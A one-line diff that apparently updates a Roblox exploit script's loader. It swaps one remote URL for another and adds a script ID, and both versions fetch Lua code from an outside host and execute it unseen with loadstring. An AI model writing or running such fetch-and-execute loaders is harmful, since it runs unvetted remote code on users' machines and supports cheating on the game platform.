@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://api.luapolsec.top/files/v4/loaders/782a60adc11241bf92b5f3f535fbd03b.lua"))()
+getgenv().SCRIPT_ID="2pzszaISKcPTaLzG";loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/5bcf3fe96a7f433777e8ee45b6aa0bd5.lua"))()
